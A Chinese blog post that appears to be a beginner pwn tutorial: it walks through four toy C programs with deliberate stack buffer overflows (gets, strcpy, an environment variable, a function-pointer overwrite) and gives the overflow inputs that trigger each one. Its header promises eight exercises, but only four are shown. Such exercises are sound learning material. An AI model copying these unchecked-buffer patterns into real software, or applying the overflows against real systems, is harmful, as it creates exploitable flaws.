---
title: 2016武汉某宣传周题目----Hurry Up
date: 2017-09-27 0:0:0
tags:
 - pwn
---
# 超级基础的8个pwn入门练习

> 如题, 作者一直不会pwn, 想要找一些入门的材料学习一下如何利用漏洞, 一个偶然的因素写了一些短小代码, 学习一下.

## 0x01
**据说这样写标题比较牛逼....**

```
#include <stdio.h>

int main(int argc, char** argv)
{
    int modified;
    char buffer[64];

    modified = 0;
    gets(buffer);
    if(modified != 0)
        printf("Pwnd!");
    else
        printf("Please try again!");
    return 0;
}
```

gets函数由于对输入长度没有校验导致的栈覆盖.
注意buffer是64字节长, 当输入超过64之后会覆盖后面地址, 由于栈是向低地址生长的, buffer在modified之前, 会导致覆盖.
利用python生成输入,用管道将python输出定位给该程序输入.

`python -c "print 'A'*64+'B'" | ./a.out`


## 0x02
```
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

int main(int argc, char** argv)
{
    int modified;
    char buffer[64];
    
    if(argc == 1){
        printf("Please check args.");
        exit(1);
    }
    modified = 0;
    strcpy(buffer, argv[1]);

    if(modified == 0x61626364)
        printf("Pwned!\n");
    else
        printf("Nice try.\n");
    return 0;
}
```
通过参数进行攻击, strcpy拷贝字符串时没有对字符串长度进行校验, 会导致覆盖后边的数据.
`./a.out $(python -c "print 'A'*64+'dcba'")`
使用$()进行命令替换, 将python打印到标准输出的内容作为输入传递, 由于小端问题需要的abcd需要以逆序输入.

## 0x03
```
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

int main(int argc, char** argv)
{
    int modified;
    char buffer[64];
    char* variable;

    variable = getenv("HUANJING");
    
    if (variable == NULL){
        printf("Please set the HUANJING environment variable\n");
        exit(1);
    }

    modified = 0;
    strcpy(buffer, variable);

    if(modified == 0x0d0a0d0a)
        printf("Pwned!\n");
    else
        printf("Nice try!\n");
    return 0;
}
```
环境变量的攻击, 使用python脚本会方便一些(因为需要环境变量包括不可见字符), 使用shell的话, 需要将不可见字符用$(\x0d)这样的形式表示出来.
```
import os

def crack():
    os.putenv("HUANJING", "A"*64+"\x0a\x0d\x0a\x0d")
    os.system("./pwn3")

crack()
```

## 0x04
```
#include <stdio.h>
#include <string.h>

typedef void (*func)();

void win(){
    printf("Pwned!\n");
}

int main(int argc, char** argv)
{
    func fp;
    char buffer[64];

    fp = NULL;
    gets(buffer);

    if(fp){
        printf("called function pointer, jumping to 0x%08x\n", fp);
        fp();
    }
    return 0;
}
```
缓冲区溢出后会覆盖调用函数的指针, 导致可以执行任意函数的漏洞, 首先确定一下需要调用函数的地址.
```
$gdb a.out
(gdb)b win
Breakingpoint 1 at 0x804841a
```
可以发现断点下在了0804841a地址, 因此64位填充之后应该紧跟这个地址, 注意倒序.
```
echo -e aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"\x1a\x84\x04\x08" > shellcode.txt
./a.out < shellcode.txt
```

下面没了...
